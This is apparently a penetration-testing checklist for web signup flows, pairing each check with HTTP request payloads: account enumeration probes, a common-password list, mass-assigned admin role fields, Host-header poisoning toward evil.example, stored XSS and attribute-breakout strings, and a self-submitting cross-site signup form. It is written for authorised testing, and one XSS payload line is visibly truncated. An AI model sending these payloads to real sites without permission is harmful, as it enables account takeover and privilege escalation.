title: Registration / signup
summary: Self-service signup: enumeration, mass-assigned roles, verify-skip, Host-poisoned activation mail, stored XSS in profile fields, and signup CSRF.

groups.title: Account creation
groups.summary: Whether signup discloses existing accounts, accepts weak secrets, or binds a role the UI never offered.

checks.title: Registration account enumeration
checks.why: A taken address or username returns a different status, body, or timing than a fresh one.
checks.validate: Responses distinguish existing from non-existing accounts consistently across repeats.

variants.name: Taken vs fresh email
variants.payload:
POST /register HTTP/1.1
Host: www.example.com
Content-Type: application/json

{"email":"known.user@example.com","password":"ChangeMe1!"}
variants.expect: Compare with a never-used address. Diff status, Location, JSON code, and body length.

variants.name: Taken username
variants.payload:
POST /register HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

username=admin&email=fresh%40example.com&password=ChangeMe1!
variants.expect: "Username taken" vs a generic failure. Also try Admin / ADMIN / admin@ vs the live account.

variants.name: Canonicalization
variants.payload:
POST /register HTTP/1.1
Host: www.example.com
Content-Type: application/json

{"email":"Known.User+tag@example.com","password":"ChangeMe1!"}
variants.expect: Plus-tags, mixed case, and unicode homoglyphs must not create a second account for the same mailbox.

checks.title: Weak and truncated passwords
checks.why: Signup accepts a documented bad password, or silently truncates a long one.
checks.validate: A known-bad or truncated secret becomes the stored credential for your test account.

variants.name: Common passwords
variants.payload:
password
Password1
12345678
qwerty
letmein
Welcome1
changeme
variants.expect: Only a handful of tries against YOUR new test account. A success is the finding.

variants.name: Long password truncation
variants.payload:
POST /register HTTP/1.1
Host: www.example.com
Content-Type: application/json

{"email":"longpw@example.com","password":"AAAAAAAAAA…(80 A)…BBBB"}
variants.expect: Register with 80 As + BBBB, then log in with only the first 16/32/64 As. If that works, the secret was truncated.

checks.title: Role / verified flag on signup
checks.why: The binder accepts role, isAdmin, verified, or tenant_id the form never sends.
checks.validate: The created account has a privilege or verified state the UI did not offer.

variants.name: Hidden privilege fields
variants.payload:
POST /register HTTP/1.1
Host: www.example.com
Content-Type: application/json

{"email":"tester@example.com","password":"ChangeMe1!","role":"admin","isAdmin":true,"verified":true,"tenant_id":1}
variants.expect: Read /me after signup. role/isAdmin/verified/tenant_id must be the defaults, not these values.

variants.name: Nested wrapper
variants.payload:
POST /register HTTP/1.1
Host: www.example.com
Content-Type: application/json

{"user":{"email":"tester2@example.com","password":"ChangeMe1!","role":"admin"}}
variants.expect: Some binders take the nested object. Also try role[]=admin and role=admin as form fields.

groups.title: Activation and abuse
groups.summary: Email verify skip, Host-poisoned activation links, stored XSS, CSRF, and bounded signup flooding.

checks.title: Email-verify skip
checks.why: The account is usable before the mailbox is proved, or a direct post-verify URL works without the token.
checks.validate: An authenticated session or privileged action succeeds without completing verification.

variants.name: Use the app immediately
variants.payload: Complete signup, do not open the mail, then GET /app or GET /api/v1/me.
variants.expect: Must stay unverified / 403. A full session is the finding if the product claims verification is required.

variants.name: Direct verify URL
variants.payload:
GET /verify-email?token= HTTP/1.1
Host: www.example.com
Cookie: session=<pre-verify-session>
variants.expect: Empty, reused, or another account's token must fail. Also try POST /verify with verified=true.

checks.title: Host-poisoned activation / invite link
checks.why: The activation email is built from Host or X-Forwarded-Host, so the token is delivered to an attacker origin.
checks.validate: The mail contains a working token URL whose host is one you control. Use a disposable inbox.

variants.name: Arbitrary Host on register
variants.payload:
POST /register HTTP/1.1
Host: evil.example
Content-Type: application/json

{"email":"tester@example.com","password":"ChangeMe1!"}
variants.expect: The mail must still point at the canonical origin. If it points at evil.example, that is the finding.

variants.name: X-Forwarded-Host
variants.payload:
POST /register HTTP/1.1
Host: www.example.com
X-Forwarded-Host: evil.example
Content-Type: application/json

{"email":"tester@example.com","password":"ChangeMe1!"}
variants.expect: Same check. Also try Forwarded: host=evil.example and duplicate Host.

variants.name: Invite accept
variants.payload:
POST /invites HTTP/1.1
Host: www.example.com
X-Forwarded-Host: evil.example
Content-Type: application/json
Authorization: Bearer <admin-token>

{"email":"new.user@example.com"}
variants.expect: Invite mail is the same class as activation mail.

checks.title: Stored XSS in signup fields
checks.why: Display name, company, or bio is stored and later rendered into HTML without encoding.
checks.validate: A marker you stored executes in a realistic viewer context (your other account or an admin review queue).

variants.name: HTML in display name
variants.payload: POST /register HTTP/1.1 Host: www.example.com Content-Type: application/json {"email":"xss@example.com","password":"ChangeMe1!","name":"","company":"
variants.expect: View the profile as another user and in any admin queue. Execution or a dangling markup capture is the finding.

variants.name: Attribute breakout
variants.payload:
POST /register HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded

email=xss2%40example.com&password=ChangeMe1!&name=%22%20onfocus%3Dalert(1)%20autofocus%3D%22
variants.expect: If the name lands in an attribute, a quote breakout executes. Confirm in the real page, not a raw JSON dump.

checks.title: Signup CSRF
checks.why: A cross-site POST creates an account or binds the victim to an attacker-chosen identity.
checks.validate: A cross-origin form creates a real account or logs the victim into one they did not start.

variants.name: Cross-site signup form
variants.payload:
<form action="https://www.example.com/register" method="POST">
  <input name="email" value="attacker@example.com">
  <input name="password" value="ChangeMe1!">
</form>
<script>document.forms[0].submit()</script>
variants.expect: Must fail without a valid CSRF token / SameSite=Strict. Impact needs a created account, not just a 200.

variants.name: JSON as text/plain
variants.payload:
POST /api/register HTTP/1.1
Host: www.example.com
Content-Type: text/plain
Origin: https://evil.example

{"email":"attacker@example.com","password":"ChangeMe1!"}
variants.expect: A JSON-only handler that also parses text/plain is CSRF-simple. Must reject or require a custom header.

checks.title: Registration flooding
checks.why: Unbounded signup creates accounts, burns mail, or DoSes a downstream identity provider.
checks.validate: A bounded burst is stopped, or it is not. Do not flood; ten tries is enough.

variants.name: Ten signups, distinct mails
variants.payload: POST /register ten times with tester+1@example.com … tester+10@example.com and the same password.
variants.expect: Captcha, backoff, or 429. If all ten succeed, record the count and stop.

variants.name: Same mail, many attempts
variants.payload: Repeat signup for one address after the first success or first pending-verify.
variants.expect: Must not create a second pending identity or resend mail without a limit.
